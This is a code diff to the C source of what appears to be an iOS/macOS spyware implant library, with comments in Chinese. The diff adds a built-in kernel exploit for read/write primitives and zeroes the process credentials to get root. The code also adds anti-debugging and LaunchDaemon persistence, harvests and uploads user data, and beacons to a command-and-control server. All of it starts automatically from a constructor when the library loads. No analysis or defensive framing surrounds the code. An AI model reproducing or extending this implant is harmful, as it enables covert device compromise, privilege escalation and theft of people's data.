@@ -1,5 +1,6 @@
 #include "memory.h"
 #include "offsets.h"
+#include "kernel_exploit.h"
 #include "injection.h"
 #include "persistence.h"
 #include "c2.h"
@@ -12,15 +13,26 @@
 static void elevate_to_root(void) {
     const KernelOffsets *off = get_kernel_offsets();
     if (!off) return;
-    uint64_t kbase   = kernel_base();
+
+    uint64_t kbase = kernel_base();
+    if (!kbase) return;
+
+    /*
+     * allproc_offset 存的是相对偏移（静态 VA − 0xFFFFFFF007004000），
+     * 加上运行时 kernel_base 得到 allproc 的运行时地址。
+     */
     uint64_t allproc = kbase + off->allproc_offset;
-    uint64_t self    = kread64(allproc);
+
+    /* 遍历 allproc 链表找到当前进程 */
+    uint64_t self = kread64(allproc);
     while (self) {
         pid_t pid = (pid_t)kread64(self + off->proc_p_pid);
         if (pid == getpid()) break;
         self = kread64(self + off->proc_p_list_next);
     }
     if (!self) return;
+
+    /* 把 uid/ruid/svuid 全置 0 → root */
     uint64_t ucred = kread64(self + off->proc_p_ucred);
     kwrite64(ucred + off->ucred_cr_uid,   0);
     kwrite64(ucred + off->ucred_cr_ruid,  0);
@@ -33,26 +45,45 @@ static void *implant_main(void *arg) {
     (void)arg;
 
     /*
-     * Wait up to 5 s for Stage3 to call coruna_init_primitives() via dlsym.
-     * dlopen() returns as soon as the constructor (below) detaches this thread,
-     * so Stage3 can do: dlsym(lib,"coruna_init_primitives")(kread,kwrite,kbase)
-     * and then this loop wakes up.
+     * 内核原语获取策略（按优先级）：
+     *
+     *  1. ke_run() — 自内置物理 OOB exploit (pe_v1) 建立 kread64/kwrite64/kbase，
+     *     成功后直接调用 coruna_init_primitives()。
+     *
+     *  2. coruna_hook_slot — 若 ke_run() 失败（A18 或 OOB 超时），
+     *     等待 Stage3_VariantB.js 通过 exploitPrimitive.write64 写入外部 VA。
+     *     此路径需要 JS 端提供真实内核 VA（通常为 0，实际无法提权）。
+     *
+     *  两条路都失败时降级：跳过提权，仍执行数据采集。
      */
-    for (int i = 0; i < 50 && !kernel_base(); i++)
-        usleep(100000); /* 50 × 100ms = 5 s max */
+
+    /* 路径 1: 自举内核 exploit */
+    if (!kernel_base()) {
+        ke_run(); /* 内部会调用 coruna_init_primitives，成功后 kernel_base() != 0 */
+    }
+
+    /* 路径 2: 等待 Stage3 写入 hook_slot (最多约 5 s) */
+    for (int i = 0; i < 50 && !kernel_base(); i++) {
+        volatile uint64_t m = coruna_hook_slot[3];
+        if (m == (uint64_t)CORUNA_HOOK_MAGIC) {
+            coruna_init_primitives_from_addrs(
+                (uint64_t)coruna_hook_slot[0],
+                (uint64_t)coruna_hook_slot[1],
+                (uint64_t)coruna_hook_slot[2]);
+            coruna_hook_slot[3] = 0;
+            break;
+        }
+        usleep(100000);
+    }
 
     if (kernel_base()) {
-        /* Kernel primitives available — escalate privileges */
         apply_anti_debug();
         elevate_to_root();
         install_launchdaemon();
     }
-    /* else: run without root — file reads still work for accessible paths */
 
-    /* Harvest and upload all available data */
     harvest_all();
 
-    /* Periodic heartbeat loop */
     while (1) {
         c2_heartbeat();
         sleep(30);
@@ -60,14 +91,9 @@ static void *implant_main(void *arg) {
     return NULL;
 }
 
-/* ── dylib constructor — runs synchronously at dlopen() time ───────────────── */
+/* ── dylib constructor ──────────────────────────────────────────────────────── */
 __attribute__((constructor))
 void coruna_constructor(void) {
-    /*
-     * Immediately detach a worker thread so dlopen() returns right away.
-     * Stage3 can then resolve and call coruna_init_primitives() before
-     * the 5-second wait in implant_main() expires.
-     */
     pthread_t tid;
     if (pthread_create(&tid, NULL, implant_main, NULL) == 0)
         pthread_detach(tid);
